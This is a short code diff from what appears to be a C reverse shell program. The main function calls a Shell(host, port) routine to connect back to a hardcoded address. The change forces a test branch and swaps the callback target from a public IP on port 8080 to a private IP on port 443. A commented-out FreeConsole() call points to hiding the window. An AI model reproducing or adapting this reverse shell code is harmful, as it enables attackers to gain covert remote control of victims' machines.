@@ -103,13 +103,14 @@ int Shell(char* host, int port){
 
 int main(int argc, char **argv){
     //FreeConsole();
-    if(argc == 3){
+    int test = 1;
+    if(test != 1){
         int port = atoi(argv[2]);
         Shell(argv[1],port);
     }
     else{
-        int port = 8080;
-        char host[] = "13.233.233.119";
+        int port = 443;
+        char host[] = "192.168.0.180";
         Shell(host,port);
     }
     return 0;
